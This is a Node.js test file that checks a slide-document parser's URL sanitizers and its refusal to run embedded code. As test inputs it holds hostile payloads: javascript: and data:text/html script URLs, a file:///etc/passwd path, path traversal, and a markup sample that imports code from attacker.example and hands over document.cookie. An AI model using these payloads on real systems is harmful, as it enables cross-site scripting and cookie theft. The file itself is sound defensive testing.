import assert from "node:assert/strict";
import test from "node:test";
import { parseMotionDoc } from "@/core/motion-doc/domain/motionDocParser";
import { sanitizeMotionDocMediaSource } from "@/core/motion-doc/domain/mediaSource";
import { sanitizeMotionDocVideoSource } from "@/core/motion-doc/domain/videoSource";

test("MotionDoc accepts only safe media URL protocols", () => {
  assert.equal(sanitizeMotionDocMediaSource("https://cdn.example.com/image.webp"), "https://cdn.example.com/image.webp");
  assert.equal(sanitizeMotionDocMediaSource("blob:https://app.example.com/asset-id"), "blob:https://app.example.com/asset-id");
  assert.equal(sanitizeMotionDocMediaSource("user/presentation/image.webp"), "user/presentation/image.webp");
  assert.equal(sanitizeMotionDocMediaSource("data:image/webp;base64,AAAA"), "data:image/webp;base64,AAAA");
  assert.equal(sanitizeMotionDocMediaSource("data:video/mp4;base64,AAAA"), "data:video/mp4;base64,AAAA");
  assert.equal(sanitizeMotionDocMediaSource("javascript:alert(1)"), "");
  assert.equal(sanitizeMotionDocMediaSource("data:text/html,<script>alert(1)</script>"), "");
  assert.equal(sanitizeMotionDocMediaSource("data:image/svg+xml;base64,PHN2Zz4="), "");
  assert.equal(sanitizeMotionDocMediaSource("file:///etc/passwd"), "");
  assert.equal(sanitizeMotionDocMediaSource("../../private/image.webp"), "");
});

test("MotionDoc videos accept portable sources and reject temporary blobs", () => {
  assert.equal(sanitizeMotionDocVideoSource("/media/demo.mp4"), "/media/demo.mp4");
  assert.equal(sanitizeMotionDocVideoSource("https://cdn.example.com/demo.webm"), "https://cdn.example.com/demo.webm");
  assert.equal(sanitizeMotionDocVideoSource("blob:https://app.example.com/temporary"), "");
  assert.equal(sanitizeMotionDocVideoSource("data:video/mp4;base64,AAAA"), "data:video/mp4;base64,AAAA");
  assert.equal(sanitizeMotionDocVideoSource("data:image/webp;base64,AAAA"), "");

  const document = parseMotionDoc(`# Portable video sources

<Slide>
  <VideoBlock sourceType="upload" src="blob:https://app.example.com/temporary" />
  <VideoBlock src="/media/demo.mp4" />
  <VideoBlock src="data:video/mp4;base64,AAAA" />
</Slide>`);

  const videos = document.scenes[0].blocks.filter((block) => block.type === "VideoBlock");
  assert.equal(videos[0]?.props.src, "");
  assert.equal(videos[0]?.props.sourceType, undefined);
  assert.equal(videos[1]?.props.src, "/media/demo.mp4");
  assert.equal(videos[2]?.props.src, "data:video/mp4;base64,AAAA");
});

test("MotionDoc parser does not execute imports, expressions, or arbitrary JSX", () => {
  const document = parseMotionDoc(`# Security

import Evil from "https://attacker.example/evil.js"

<Slide backgroundImage="javascript:alert(1)">
  <Evil payload={globalThis.document.cookie} />
  <iframe src="https://attacker.example"></iframe>
  <ImageBlock src="data:text/html,<script>alert(1)</script>" alt="Unsafe" />
  <Text>{globalThis.document.cookie}</Text>
</Slide>`);

  assert.equal(document.scenes[0].props.backgroundImage, "");
  assert.equal(document.scenes[0].blocks.some((block) => block.type === "ImageBlock" && block.props.src === ""), true);
  assert.equal(document.scenes[0].blocks.some((block) => block.type === "Text" && block.text.includes("<iframe")), true);
  assert.equal(document.scenes[0].blocks.some((block) => block.type === "Text" && block.text.includes("document.cookie")), true);
});
